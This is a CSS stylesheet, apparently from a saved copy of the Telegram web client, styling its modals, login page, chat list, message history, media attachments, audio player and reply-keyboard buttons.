.modal-dialog{margin:0 auto}
.modal-content{border:0;border-radius:0;-webkit-box-shadow:0 1px 10px rgba(0,0,0,.15);-moz-box-shadow:0 1px 10px rgba(0,0,0,.15);box-shadow:0 1px 10px rgba(0,0,0,.15)}
.modal-header{padding:12px 0 4px 3px;border-bottom:2px solid #E1E1E1;margin:0 18px}
.modal-title{color:#222;font-weight:700;font-size:17px;line-height:1.4}
.modal-close-link,.modal-head-link{font-size:12px;line-height:1.4;float:right;padding:0 2px;margin:6px 2px 0 0}
.modal-close-link:hover,.modal-head-link:hover{text-decoration:none}
.modal-head-link{margin-right:15px}
.modal-close-button{position:absolute;z-index:1051;top:0;right:0;width:54px;height:54px}
.modal-close-button i{display:inline-block;width:12px;height:12px;margin:21px;opacity:.8;background-image:/*savepage-url=../img/icons/IconsetW.png*/url();background-repeat:no-repeat;background-position:-15px -320px}
.is_2x .modal-close-button i{background-image:/*savepage-url=../img/icons/IconsetW_2x.png*/url();background-size:42px 1171px}
.modal-close-button:hover i{opacity:1}
.modal-body{padding:14px}
.modal-footer{padding:0 14px 13px;margin:0;border-top:0}
.modal_simple_header{font-size:14px;margin:0 0 10px;text-align:center;font-weight:700}
.modal_simple_form{max-width:276px;margin:0 auto}
.modal_simple_form h4{font-size:14px;margin-bottom:38px;text-align:left}
.modal_simple_form .form-group{margin-bottom:13px}
.modal_simple_form_description{color:#777;line-height:160%;margin:10px 0 0;text-align:justify}
.md_simple_header{font-size:14px;margin:0 0 10px;font-weight:700}
.md_simple_modal_body{padding:40px 37px 0}
.md_simple_modal_body .modal_simple_form{max-width:none;margin:0;padding:0}
.md_simple_modal_body .modal_simple_form h4{font-size:14px;margin-top:0;margin-bottom:38px;text-align:left;font-weight:700}
.md_simple_form_description{color:#777;line-height:160%;margin:0 0 10px;text-align:justify}
.md_simple_modal_footer{text-align:right;padding:10px 27px 15px}
.md_simple_modal_footer .btn{margin-left:10px}
.modal_section_header{font-size:12px;line-height:14px;color:#999;background:#f5f5f5;padding:7px 14px;margin:0}
.modal_section_body{padding:14px}
.modal_section_body dl,.modal_section_body p{margin:5px 0}
.modal_section:last-child .modal_section_body{padding-bottom:8px}
a.tg_checkbox,p.tg_checkbox{color:#000;display:block;line-height:18px;padding:8px 0;margin:9px 0}
a.tg_checkbox:hover,p.tg_checkbox:hover{text-decoration:none}
.tg_checkbox span.icon-checkbox-outer{float:right;display:inline-block;background-color:#e6e6e6;width:36px;height:14px;line-height:14px;vertical-align:middle;border-radius:8px;margin:3px 0;-webkit-transition:background-color ease-in-out .1s;transition:background-color ease-in-out .1s}
.tg_checkbox.tg_checkbox_on span.icon-checkbox-outer{background-color:#bfd9ed}
.tg_checkbox i.icon-checkbox-inner{display:inline-block;background:#fff;width:20px;height:20px;border-radius:10px;overflow:hidden;float:left;margin-left:-1px;margin-top:-3px;-webkit-transition:all ease .1s;transition:all ease .1s;border:1px solid #E7E7E7;-webkit-box-shadow:0 0 1px rgba(0,0,0,.05);-moz-box-shadow:0 0 1px rgba(0,0,0,.05);box-shadow:0 0 1px rgba(0,0,0,.05)}
.tg_checkbox.tg_checkbox_on i.icon-checkbox-inner{background:#6b9bc2;margin-left:16px;border:0;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none}
.tg_checkbox_label{display:inline-block;line-height:18px;vertical-align:middle}
.tg_radios_wrap{margin:15px 0}
a.tg_radio{color:#000;display:block;line-height:20px;padding:5px 0 6px}
a.tg_radio:hover{text-decoration:none}
.tg_radio .icon-radio-outer{display:inline-block;width:20px;height:20px;line-height:20px;vertical-align:middle;border-radius:10px;border:2px solid #d8d8d8;overflow:hidden;margin:0 8px 0 0;-webkit-transition:border-color ease-in-out .1s;transition:border-color ease-in-out .1s}
i.icon-radio{display:inline-block;background-color:#fff;width:16px;height:16px;line-height:16px;border-radius:8px;border:3px solid #fff;-webkit-transition:background-color ease-in-out .1s;transition:background-color ease-in-out .1s}
.tg_radio.tg_radio_on .icon-radio-outer{border-color:#5c8db3}
.tg_radio.tg_radio_on i.icon-radio{background-color:#6b9bc2}
a.tg_radio:hover i.icon-radio{background-color:#f2f2f2}
a.tg_radio_on:hover i.icon-radio{background-color:#5785aa}
.tg_radio_label{display:inline-block;line-height:20px;vertical-align:middle}
.tg_range_wrap{line-height:18px}
.tg_slider_wrap{position:relative;cursor:pointer;line-height:18px;height:18px}
.tg_slider_track{position:absolute;background:#c4daec;height:4px;margin:7px 0;width:100%;z-index:2}
.tg_slider_track_fill{background:#83afd2;height:4px}
.tg_slider_thumb{position:absolute;border:0;background:#6b9bc2;width:18px;height:18px;border-radius:9px;z-index:3}
.tg_form_group{padding:6px 0}
.tg_form_group:first-child{padding-top:0}
.tg_form_group:last-child{padding-bottom:0}
.img_fullsize_with_progress_wrap{position:relative;margin:0 auto}
.img_fullsize_progress_overlay{position:absolute;width:100%;height:100%}
.img_fullsize_progress_wrap{position:relative}
.img_fullsize_progress{position:absolute;bottom:0;left:0;width:100%;height:25px;margin:0;background:rgba(0,0,0,.5);border:0;border-radius:0;padding:10px}
.nano-content{outline:0!important}
.login_head_bg{background:#5682a3;height:226px}
.login_page{margin:-131px auto 90px;max-width:404px}
.login_head_wrap{height:75px}
.login_head_logo_link{display:inline-block;line-height:30px;padding:23px 15px 22px}
.tg_logo_wrap{line-height:30px!important}
.icon-tg-logo{width:30px;height:30px;display:inline-block;vertical-align:top;margin-right:18px;background-image:/*savepage-url=../img/icons/General.png*/var(--savepage-url-3);background-repeat:no-repeat;background-position:-5px -10px}
.is_2x .icon-tg-logo{background-image:/*savepage-url=../img/icons/General_2x.png*/url();background-size:40px 948px}
.icon-tg-title{width:62px;height:14px;display:inline-block;vertical-align:middle;background-image:/*savepage-url=../img/Telegram.svg*/var(--savepage-url-4);background-repeat:no-repeat;background-position:0 0;margin-top:1px}
.login_head_submit_progress,.login_head_submit_wrap{float:right}
.login_head_submit_wrap{font-weight:700}
.login_head_submit_btn,.login_head_submit_progress{font-size:13px;line-height:20px;padding:27px 15px 28px;display:inline-block;color:#fff}
.login_head_submit_btn:active,.login_head_submit_btn:focus,.login_head_submit_btn:hover{color:#fff;text-decoration:none}
.icon-next-submit{width:7px;height:12px;display:inline-block;vertical-align:middle;margin-left:12px;margin-top:-1px;background-image:/*savepage-url=../img/icons/General.png*/var(--savepage-url-3);background-repeat:no-repeat;background-position:-18px -50px}
.is_2x .icon-next-submit{background-image:/*savepage-url=../img/icons/General_2x.png*/url();background-size:40px 948px}
.login_footer_wrap{color:#84a2bc;font-size:13px;line-height:16px;margin-top:25px;text-align:center}
.logo_footer_learn_more_link,.logo_footer_learn_more_link:active,.logo_footer_learn_more_link:focus,.logo_footer_learn_more_link:hover{color:#84a2bc;font-weight:700}
.login_form_wrap{background:#fff;padding:44px 65px;-webkit-box-shadow:0 1px 1px rgba(97,127,152,.2),1px 0 0 rgba(97,127,152,.1),-1px 0 0 rgba(97,127,152,.1);-moz-box-shadow:0 1px 1px rgba(97,127,152,.2),1px 0 0 rgba(97,127,152,.1),-1px 0 0 rgba(97,127,152,.1);box-shadow:0 1px 1px rgba(97,127,152,.2),1px 0 0 rgba(97,127,152,.1),-1px 0 0 rgba(97,127,152,.1);border-radius:2px;border:0;margin:0;max-width:none}
.login_phone_country_input_group{cursor:pointer}
.login_phone_num_input_group{overflow:hidden}
.login_phone_code_input_group{float:left;width:50px;margin-right:25px}
.login_footer_about_wrap{background:#fff;margin-top:12px;padding:44px 65px;-webkit-box-shadow:0 1px 0 #dfe5ec;-moz-box-shadow:0 1px 0 #dfe5ec;box-shadow:0 1px 0 #dfe5ec;border-radius:3px;border:1px solid #dfe5ec}
.login_footer_about_wrap h3{margin:0 0 20px;font-size:15px;font-weight:700;text-align:left}
.login_footer_about_wrap h3 .login_footer_about_hide{color:#999;font-size:80%;font-weight:400;margin-left:8px}
.login_footer_about_wrap p{margin:0 0 20px;font-size:13px;line-height:160%}
.login_footer_about_wrap p:last-child{margin:0}
.login_form_head{color:#222;margin:0 0 20px;font-size:15px;font-weight:700}
.login_form_lead{color:#999;margin:15px 0 30px;font-size:13px;line-height:160%}
.login_form_hint{color:#999;margin:0 0 20px;font-size:13px;line-height:160%}
.login_form_messaging{color:#999;font-size:13px;margin-top:20px;line-height:160%}
.login_phone_head{color:#222;font-size:15px;font-weight:700;text-align:center;margin:0}
.login_edit_phone{margin:5px 0 15px;text-align:center}
.login_smscode_lead{color:#999;margin:15px 0;line-height:160%;text-align:center}
.login_smscode_lead:last-child{margin-bottom:30px}
.login_forgot_button{text-align:center;margin:30px 0 10px}
.login_reset_button{text-align:center;margin:10px 0 0}
.im_dialogs_empty_wrap{margin:60px 50px;text-align:center}
.im_dialogs_import_phonebook{margin-top:10px}
.im_dialogs_panel{padding:12px;position:relative}
.im_dialogs_modal_col_wrap .im_dialogs_panel{padding:7px 12px 6px;-webkit-box-shadow:0 1px 1px rgba(0,0,0,.15);-moz-box-shadow:0 1px 1px rgba(0,0,0,.15);box-shadow:0 1px 1px rgba(0,0,0,.15);z-index:1}
.im_dialogs_search{position:relative}
.im_dialogs_search_field{font-size:12px;line-height:normal;border:1px solid #F2F2F2;border-radius:2px;padding:6px 26px 6px 30px;margin:0;background-color:#F2F2F2;background-image:/*savepage-url=../img/icons/IconsetW.png*/url();background-repeat:no-repeat;background-position:-6px -205px}
.is_2x .im_dialogs_search_field{background-image:/*savepage-url=../img/icons/IconsetW_2x.png*/url();background-size:42px 1171px}
.im_dialogs_modal_col_wrap .im_dialogs_search_field{background-color:#fff;border-color:#fff!important}
.im_dialogs_search_field:active,.im_dialogs_search_field:focus{background-color:#fff}
.im_dialogs_search_field::-ms-clear{display:none}
a.tg_search_clear{position:absolute;right:0;margin-top:-34px;width:34px;height:34px;opacity:.6}
.contacts_modal_search a.tg_search_clear{right:12px}
a.tg_search_clear:hover{opacity:1}
i.icon-search-clear{display:inline-block;color:#999;width:13px;height:13px;margin:10px 0 0 11px;vertical-align:text-top;background-image:/*savepage-url=../img/icons/IconsetW.png*/url();background-repeat:no-repeat;background-position:-15px -192px}
.is_2x i.icon-search-clear{background-image:/*savepage-url=../img/icons/IconsetW_2x.png*/url();background-size:42px 1171px}
i.icon-verified{display:inline-block;width:17px;height:17px;vertical-align:text-top;background-image:/*savepage-url=../img/icons/ProfileIcons.png*/url();background-repeat:no-repeat;background-position:-11px -373px}
.is_2x i.icon-verified{background-image:/*savepage-url=../img/icons/ProfileIcons_2x.png*/url();background-size:40px 420px}
.im_dialogs_scrollable_wrap i.icon-verified{display:none}
.im_dialogs_col_search i.icon-verified{display:inline-block}
.im_dialogs_scrollable_wrap{outline:0!important}
.im_dialogs_scrollable_wrap .im_dialog_wrap{margin-top:0}
.im_dialogs_scrollable_wrap a.im_dialog{clear:both;overflow:hidden;color:#000;padding:8px 9px;border-radius:0}
.im_dialogs_scrollable_wrap a.im_dialog:hover,.im_dialogs_scrollable_wrap a.im_dialog_selected{border-radius:0;background:#f2f6fa}
.im_dialogs_scrollable_wrap a.im_dialog .glyphicon,.im_dialogs_scrollable_wrap a.im_dialog .icon{display:none}
.im_dialogs_scrollable_wrap .active a.im_dialog{border-radius:0;background-color:#6490b1}
.im_dialogs_scrollable_wrap .active a.im_dialog:hover,.im_dialogs_scrollable_wrap .active a.im_dialog_selected{background-color:#6490b1}
.im_dialogs_modal_list{padding-top:10px}
.im_dialog_message_wrap{word-wrap:break-word}
a.im_dialog .im_dialog_chat_from_wrap,a.im_dialog .im_short_message_media,a.im_dialog .im_short_message_service{color:#3a6d99}
a.im_dialog .im_short_message_text{color:grey}
a.im_dialog .im_dialog_draft_from{color:#c05f5a}
a.im_dialog:hover .im_short_message_text,a.im_dialog_selected .im_short_message_text{color:#698192}
.active a.im_dialog .im_dialog_chat_from_wrap,.active a.im_dialog .im_dialog_draft_from,.active a.im_dialog .im_dialog_message,.active a.im_dialog .im_short_message_media,.active a.im_dialog .im_short_message_service,.active a.im_dialog .im_short_message_text{color:#fff}
.im_dialogs_scrollable_wrap a.im_dialog_searchpeer .icon-search-clear{display:inline-block;cursor:pointer;pointer-events:all}
.im_dialogs_scrollable_wrap a.im_dialog_searchpeer,.im_dialogs_scrollable_wrap a.im_dialog_searchpeer:hover,.im_dialogs_scrollable_wrap a.im_dialog_searchpeer_selected{background:#f3f3f3}
.im_dialog_peer{color:#222;font-weight:700;margin-top:2px;margin-bottom:2px}
.active .im_dialog_peer{color:#fff}
.im_dialog_badge{background:#64c270;font-size:11px;padding:5px;border-radius:11px;min-width:21px;text-align:center;margin-top:4px}
.active .im_dialog_badge{color:#428bca;background-color:#fff}
.im_dialogs_modal_col .im_dialog_badge{display:none}
.im_dialog_badge_muted{background:#bfbfbf}
.im_dialog_unread{background:#c1d6e5;display:inline-block;float:right;width:8px;height:8px;border-radius:5px;overflow:hidden;margin:12px 0 0}
a.im_dialog:hover .im_dialog_unread,a.im_dialog_selected .im_dialog_unread{background:#a3c0d4}
.active .im_dialog_unread{background-color:#a4c4dd}
.im_dialog_pinned{display:inline-block;float:right;width:14px;height:14px;overflow:hidden;margin:12px 0 0;background-image:/*savepage-url=../img/icons/General.png*/var(--savepage-url-3);background-repeat:no-repeat;background-position:-13px -916px}
.is_2x .im_dialog_pinned{background-image:/*savepage-url=../img/icons/General_2x.png*/url();background-size:40px 948px}
.active .im_dialog_pinned,a.im_dialog:hover .im_dialog_pinned,a.im_dialog_selected .im_dialog_pinned{background-position:-13px -916px}
.im_dialog_date{color:#b3b3b3;font-size:.85em}
a.im_dialog:hover .im_dialog_date,a.im_dialog_selected .im_dialog_date{color:#91a6ba}
.active .im_dialog_date,.active a.im_dialog:hover .im_dialog_date,.active a.im_dialog_selected .im_dialog_date{color:#b8d1e4}
.im_dialog_message,.im_dialog_peer{overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
.im_dialog_message_wrap{height:44px;overflow:hidden}
.im_dialog_message{color:grey}
.icon-caret{width:8px;height:4px;display:inline-block;vertical-align:text-top;margin-top:7px;margin-left:6px;background-image:/*savepage-url=../img/icons/IconsetW.png*/url();background-repeat:no-repeat;background-position:-17px -444px}
.is_2x .icon-caret{background-image:/*savepage-url=../img/icons/IconsetW_2x.png*/url();background-size:42px 1171px}
.im_dialogs_empty_header{font-size:15px;color:grey;margin:0 0 15px}
.im_dialogs_empty_lead{color:grey;margin-bottom:18px}
.im_history_scrollable_wrap{outline:0!important;position:relative}
.im_history_to_bottom{overflow:hidden}
.im_history_to_bottom .im_history_scrollable{position:absolute;bottom:0;width:100%}
.im_history_pinned_wrap{padding:7px 10px 7px 20px;border-bottom:1px solid #E9EBED}
.im_history_pinned_message{cursor:pointer}
.im_history_pinned_message:hover{text-decoration:none}
.im_history_pinned_hide{float:right;display:block;width:18px;height:18px;margin-right:6px;margin-top:11px;-webkit-transform:translate3d(0,0,0);padding-top:7px}
.im_history_pinned_hide .icon-reply-bar{display:block;background:#999;width:18px;height:2px;transform-origin:50% 50%}
.im_history_pinned_hide:hover .icon-reply-bar{background:#44a1e8}
.im_history{padding:0;position:relative}
.im_message_unread_split{background:#f0f4f7;color:#8096a8;text-align:center;padding:4px 10px;margin:10px 0}
.im_message_author,.im_message_fwd_author{color:#3a6d99;font-weight:700}
.im_message_author_via,.im_message_fwd_via{color:#3a6d99}
.im_message_author_via:hover,.im_message_fwd_via:hover{text-decoration:none}
.im_message_author_via:hover .im_message_fwd_author,.im_message_fwd_via:hover .im_message_fwd_author{text-decoration:underline}
.non_osx .im_message_author_wrap,.non_osx .im_message_fwd_author_wrap{font-size:12px}
.im_message_author_via{color:#3a6d99;margin-left:5px}
.im_message_fwd_via{margin-left:0}
.im_message_author_admin{color:#adadad;margin-left:6px;font-size:11px}
.im_message_contact_photo,.im_message_from_photo,.im_message_fwd_photo{width:42px;height:42px;border-radius:50%;overflow:hidden}
.im_message_contact_photo .peer_initials,.im_message_from_photo .peer_initials,.im_message_fwd_photo .peer_initials{line-height:42px}
a.im_message_contact_photo,a.im_message_from_photo{margin:0 15px 0 0}
.non_osx .im_message_contact_name{font-size:12px}
.im_message_contact_name{font-weight:700}
.im_message_contact_name,.im_message_contact_phone{white-space:nowrap}
a.im_message_photo_thumb,a.im_message_video_thumb{display:block;overflow:hidden;border-radius:2px}
img.im_message_photo_thumb,img.im_message_video_thumb{overflow:hidden;border-radius:2px}
.im_message_video,a.im_message_photo_thumb{margin-top:5px}
a.im_message_video_thumb{float:left;margin-right:15px;position:relative}
img.im_message_video_thumb_blurred{-webkit-filter:blur(2px);-moz-filter:blur(2px);-o-filter:blur(2px);-ms-filter:blur(2px);filter:blur(2px);filter:progid:DXImageTransform.Microsoft.Blur(PixelRadius='2')}
div.im_message_video_thumb{position:relative}
.im_message_video_duration{background:rgba(0,0,0,.4);color:#fff;position:absolute;bottom:4px;right:4px;padding:2px 6px;font-size:11px;line-height:15px;border-radius:2px;overflow:hidden;z-index:1}
.icon-videoplay{position:absolute;display:inline-block;top:50%;left:50%;margin-left:-5px;margin-top:-9px;z-index:1;width:0;height:0;border-style:solid;border-width:9px 0 9px 14px;border-color:transparent transparent transparent #fff}
.im_message_geopoint{border-radius:2px;margin-top:5px;overflow:hidden;display:block;position:relative;width:300px;height:150px}
.im_message_venue_geopoint_wrap{display:block;position:relative;overflow:hidden;width:100px;height:100px;margin-right:10px;float:left;border-radius:2px;background:#f2f2f2;text-align:center;line-height:0}
.icon-geo-point{position:absolute;display:inline-block;top:50%;left:50%;margin-left:-8px;margin-top:-15px;width:15px;height:19px;background-image:/*savepage-url=../img/icons/IconsetW.png*/url();background-repeat:no-repeat;background-position:-14px -389px}
.is_2x .icon-geo-point{background-image:/*savepage-url=../img/icons/IconsetW_2x.png*/url();background-size:42px 1171px}
.im_message_media_embed{position:relative;height:0;overflow:hidden;margin-top:5px}
.im_message_media_embed iframe,.im_message_media_embed webview{position:absolute;top:0;left:0;width:100%;height:100%}
.im_message_webpage_wrap{margin:3px 0;border-left:2px solid #7eaad1;padding-left:12px}
.im_message_webpage_site{color:#999;font-weight:400;line-height:120%;margin-bottom:3px}
.im_message_webpage_title{font-weight:700}
.im_message_sign{padding-top:1px}
.im_message_sign_link{pointer-events:none;color:#adadad;font-size:.95em}
.icon-circle{display:none;width:.5em;height:.5em;border-radius:.5em;background:#999;overflow:hidden;vertical-align:middle;margin:-2px 3px 0}
.im_message_webpage_description{margin:2px 0}
.im_message_webpage_article_photo{display:block;margin:5px 0 5px 5px}
.im_message_video_embed{padding-bottom:56.25%}
.im_message_insta_embed{padding-bottom:122%}
.im_message_vine_embed{padding-bottom:100%}
.im_message_soundcloud_embed{padding-bottom:56.25%}
.im_message_spotify_embed{width:300px;height:80px}
.im_message_twitter_embed>blockquote{visibility:hidden}
.im_message_webpage_gif .img_gif_with_progress_wrap{margin-top:5px;display:block}
.im_message_gif_wrap{position:relative}
.img_gif_with_progress_wrap{display:inline-block;line-height:0}
.im_message_gif_btn{color:#fff;font-style:normal;font-weight:700;position:absolute;display:inline-block;top:50%;left:50%;margin-left:-22px;margin-top:-21px;border:2px solid #fff;border-radius:20px;padding:10px;z-index:1}
.im_message_audio,.im_message_document,.im_message_upload_file,.im_message_video{margin-top:3px;width:317px}
.im_message_audio{margin-top:3px}
.im_message_file_button{display:block;background:rgba(218,228,234,.5);float:left;width:42px;height:42px;border-radius:50%;margin-right:10px}
.im_message_file_button_icon{display:inline-block;line-height:0;width:12px;height:18px;margin:12px 15px;background-image:/*savepage-url=../img/icons/General.png*/var(--savepage-url-3);background-repeat:no-repeat;background-position:-14px -509px}
.is_2x .im_message_file_button_icon{background-image:/*savepage-url=../img/icons/General_2x.png*/url();background-size:40px 948px}
.im_message_file_button_dl_doc .im_message_file_button_icon{background-position:-12px -561px;width:16px;height:18px;margin:13px}
.im_message_file_button_dl_audio{background:#6490b1;border-radius:50%}
.im_message_file_button_dl_audio .im_message_file_button_icon{display:block;width:14px;height:16px;margin:13px 16px;background-image:/*savepage-url=../img/icons/General.png*/var(--savepage-url-3);background-repeat:no-repeat;background-position:-13px -611px}
.is_2x .im_message_file_button_dl_audio .im_message_file_button_icon{background-image:/*savepage-url=../img/icons/General_2x.png*/url();background-size:40px 948px}
.im_message_file_button_dl_audio .audio_player_btn_icon_pause,.is_1x .im_message_file_button_dl_audio .audio_player_btn_icon_pause{width:12px;height:14px;background-position:-14px -587px;margin:14px 15px}
.im_history_select_active .im_message_outer_wrap:hover .icon-document,.im_message_selected .icon-document{background-color:#dae6f0;background-position:-2px -542px}
.im_history_select_active .clickable,.im_history_select_active a,.im_history_select_active button{pointer-events:none}
.im_message_document_link_disabled{cursor:default;pointer-events:none}
.im_message_document_info{float:left}
.im_message_document_thumb_wrap{border-radius:2px;overflow:hidden;background:#f2f2f2;width:100px;min-height:38px;max-height:100px;margin-right:10px;text-align:center;float:left;line-height:0}
img.im_message_document_thumb{max-width:100px;max-height:100px;vertical-align:middle}
.im_message_document_name_wrap{overflow:hidden;white-space:nowrap;text-overflow:ellipsis;width:265px;padding:0 0 1px}
.im_message_document_actions{width:265px}
.im_message_document_name{color:#3a6d99;display:inline-block;font-weight:700;max-width:170px;overflow:hidden;vertical-align:text-top;white-space:nowrap;text-overflow:ellipsis}
.im_message_document_name:after{content:attr(data-name);display:block;overflow:hidden;text-overflow:ellipsis}
.im_message_document_name:before{content:attr(data-ext);float:right}
.im_message_document_name:hover:before{text-decoration:underline}
.im_message_document_size{color:#999;padding-left:2px;vertical-align:text-top}
.audio_player_actions a,.im_message_document_actions a{margin-right:10px}
.audio_player_title_wrap{overflow:hidden;white-space:nowrap;text-overflow:ellipsis;padding:1px 0;line-height:16px;height:19px;width:200px}
.audio_player_title{display:inline-block;font-weight:700;max-width:100px;overflow:hidden;vertical-align:text-top;white-space:nowrap;text-overflow:ellipsis}
.icon-audio-unread{display:inline-block;width:6px;height:6px;background:#4eabf1;border:0;border-radius:4px;margin:5px 5px 0 2px;vertical-align:text-top}
.audio_player_meta{overflow:hidden;vertical-align:text-top;display:inline-block}
.audio_player_duration,.audio_player_size{color:#999;padding-left:2px}
.audio_player_actions{margin-top:3px}
.audio_player_seek_slider{float:left;margin-right:15px;width:200px}
.audio_player_seek_slider .tg_slider_wrap{height:18px;line-height:18px}
.audio_player_seek_slider .tg_slider_track{margin:7px 0;background:rgba(218,228,234,.5);height:4px;border-radius:0}
.audio_player_seek_slider .tg_slider_track_fill{background:#6490b1;height:4px;width:0}
.audio_player_seek_slider .tg_slider_thumb{display:none}
.audio_player_seek_slider:hover .tg_slider_thumb{display:block}
.audio_player_volume_slider{width:50px;float:left}
.audio_player_volume_slider .tg_slider_wrap{height:18px;line-height:18px}
.audio_player_volume_slider .tg_slider_thumb{display:none;background:#6490b1;width:4px;height:10px;line-height:16px;margin-top:4px;border-radius:0}
.audio_player_volume_slider:hover .tg_slider_thumb{display:block}
.audio_player_volume_slider .tg_slider_track{margin:7px 0;background:rgba(218,228,234,.5);height:4px}
.audio_player_volume_slider .tg_slider_track_fill{background:#6490b1;height:4px;width:0}
.audio_player_progress_wrap{overflow:hidden}
.audio_player_progress_wrap .tg_down_progress{margin-top:5px}
.audio_player_media{position:absolute;visibility:hidden}
.audio_player_media canvas{display:none}
.im_message_download_progress_wrap,.im_message_upload_progress_wrap{margin-top:5px;width:200px}
.im_message_document_thumbed .im_message_document_actions,.im_message_document_thumbed .im_message_document_name_wrap,.im_message_document_thumbed .im_message_download_progress_wrap,.im_message_document_thumbed .im_message_upload_progress_wrap{width:207px}
.im_message_document_thumbed .im_message_document_name{max-width:110px}
.im_message_video .im_message_document_actions,.im_message_video .im_message_document_name_wrap,.im_message_video .im_message_download_progress_wrap{width:152px}
.im_message_video .im_message_document_name_wrap{margin-top:5px}
.im_message_cancelable_progress_wrap,.im_message_playback_progress_wrap{margin-top:4px}
.im_message_media_progress_cancel{margin-left:15px;line-height:100%;width:50px;display:block;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
.tg_down_progress,.tg_up_progress{height:4px;margin:0;padding:0;background:rgba(218,228,234,.5);border:0;border-radius:0;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none}
.tg_down_progress .progress-bar,.tg_up_progress .progress-bar{height:4px;line-height:4px;background:#6B9ABD;border-radius:0;overflow:hidden;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none}
.im_service_message_wrap{text-align:center}
.im_bot_intro_message_wrap{max-width:300px;padding:4px 10px;margin:10px auto;color:#000;line-height:1.4;text-align:left;font-size:13px}
.im_bot_intro_message_header{font-weight:700;text-align:center}
.im_bot_intro_message{margin-top:10px}
.im_service_message{display:block;min-width:10px;padding:4px 7px;line-height:1.4;color:#999;text-align:center;border-radius:10px;margin:5px 0}
.im_service_message_photo_thumb{display:inline-block;margin:0 auto}
.im_service_message .im_service_message_pinned{color:inherit;font-weight:700;display:inline-block;max-width:150px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;vertical-align:middle}
.im_service_message_phonecall{color:inherit!important;font-weight:700}
.im_service_message_phonecall_duration{font-weight:400}
.im_message_date,.im_message_fwd_date{color:#adadad;font-size:.85em;padding:0 0 20px 10px}
.im_message_edited{display:none}
.im_message_date_text{cursor:pointer}
.im_message_date_text:hover{text-decoration:underline}
div.im_message_author,div.im_message_body{display:block;overflow:hidden}
.im_message_body{-webkit-user-select:text;-moz-user-select:text;-ms-user-select:text;user-select:text}
.im_message_error_btn{display:none}
.im_message_error .im_message_error_btn{display:inline}
.im_message_error_btn .icon-message-status{background:#da564d;opacity:.85;pointer-events:auto}
.im_message_error_btn .icon-message-status:hover{opacity:1}
.im_message_views_wrap{position:relative}
.im_message_views{display:inline-block;position:absolute;white-space:nowrap;line-height:normal}
.im_message_views_inline{display:inline-block;white-space:nowrap;font-size:.85em;margin-left:5px}
.icon-message-views{display:inline-block;width:16px;height:11px;background-image:/*savepage-url=../img/icons/General.png*/var(--savepage-url-3);background-repeat:no-repeat;background-position:-12px -850px;vertical-align:text-bottom;margin-right:.3rem}
.is_2x .icon-message-views{background-image:/*savepage-url=../img/icons/General_2x.png*/url();background-size:40px 948px}
.im_history_select_active .im_message_outer_wrap:hover .icon-message-views,.im_message_selected .icon-message-views,.message_focus .icon-message-views{background-position:-12px -871px}
.im_message_views_cnt{color:#adadad;font-weight:700;vertical-align:top}
.im_message_reply_wrap{display:block;color:inherit;text-decoration:none;margin-bottom:5px;margin-top:2px;overflow:hidden}
.im_message_reply_wrap:hover{text-decoration:none;color:inherit}
.im_message_reply_border{background:#7eaad1;height:33px;width:2px;position:absolute;margin-left:-12px}
.im_message_reply{padding-left:12px}
.im_message_reply_thumb_wrap{display:block;float:left;width:42px;height:42px;text-align:center;position:absolute}
.im_message_reply_author{font-weight:700;color:#3a6d99;line-height:16px;margin-bottom:3px}
.non_osx .im_message_reply_author{font-size:12px}
.im_message_reply_loading{padding:7px 0 8px}
.im_message_reply_body .im_short_message_media,.im_message_reply_body .im_short_message_service{color:#999}
.im_message_reply_body{line-height:16px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;margin-bottom:1px}
.im_message_reply_thumbed .im_message_reply_border,.im_message_reply_thumbed .im_message_reply_wrap{height:42px}
.im_message_reply_thumbed .im_message_reply_author{margin-top:4px}
.im_message_reply_thumbed .im_message_reply_author,.im_message_reply_thumbed .im_message_reply_body{margin-left:52px}
.im_message_reply_wrap .im_message_reply_thumbed{margin-bottom:4px}
a.im_message_fwd_photo{position:absolute;margin-top:1px}
.im_message_fwd_date{padding:0}
.im_message_text{word-wrap:break-word;line-height:150%;white-space:pre-wrap}
.im_message_document_caption,.im_message_photo_caption,.im_message_video_caption{margin-top:3px;clear:both;word-wrap:break-word;line-height:150%;white-space:pre-wrap}
.im_message_mymention{background:#fff8cc}
.reply_markup_wrap{margin:15px -2px 0}
.im_message_keyboard .reply_markup_wrap{margin-top:7px}
.reply_markup_row{padding:4px 0;line-height:0}
.reply_markup_row:first-child{padding-top:0}
.reply_markup_row:last-child{padding-bottom:0}
.reply_markup_scrollable_wrap.active-scrollbar .reply_markup_row{margin-right:6px}
.reply_markup_button_wrap{display:inline-block;padding:0 4px}
.reply_markup_button{color:#3a6d99;display:block;width:100%;background:#f0f4f7;height:30px;font-size:13px;margin:0;padding:6px;overflow:hidden;text-overflow:ellipsis}
.reply_markup_h1 .reply_markup_button{height:170px}
.reply_markup_h2 .reply_markup_button{height:81px}
.reply_markup_h3 .reply_markup_button{height:51px}
.reply_markup_h4 .reply_markup_button{height:36px}
.reply_markup_button:focus,.reply_markup_button:hover{color:#3a6d99;background:#dfe8f0}
.reply_markup_button_w1{width:100%}
.reply_markup_button_w2{width:50%}
.reply_markup_button_w3{width:33.3333333%}
.reply_markup_button_w4{width:25%}
.reply_markup_button_w5{width:20%}
.reply_markup_button_w6{width:16.6666666%}
.reply_markup_button_w7{width:14.2857142%}
.reply_markup_button_w8{width:12.5%}
.reply_markup_button_w9{width:11.1111111%}
.reply_markup_button_w10{width:10%}
.reply_markup_button_w11{width:9.09090909%}
.reply_markup_button_w12{width:8.33333333%}
.im_history_not_selected_wrap{display:none}
.im_page_peer_not_selected .im_history_not_selected_wrap{display:block}
.im_history_selected_wrap{display:none}
.im_history_loaded .im_history_selected_wrap{display:block}
.im_page_peer_not_selected .im_history_selected_wrap{display:none}
.im_history_selected_loading_wrap{display:block}
.im_history_loaded .im_history_selected_loading_wrap,.im_page_peer_not_selected .im_history_selected_loading_wrap{display:none}
.im_history_empty,.im_history_not_selected{visibility:hidden;text-align:center;color:#999;font-size:16px;line-height:18px;padding:1px 50px;margin:0}
.im_history_empty.vertical-aligned,.im_history_not_selected.vertical-aligned{visibility:visible}
.im_history_to_bottom .im_history_empty,.im_history_to_bottom .im_history_not_selected{display:none}
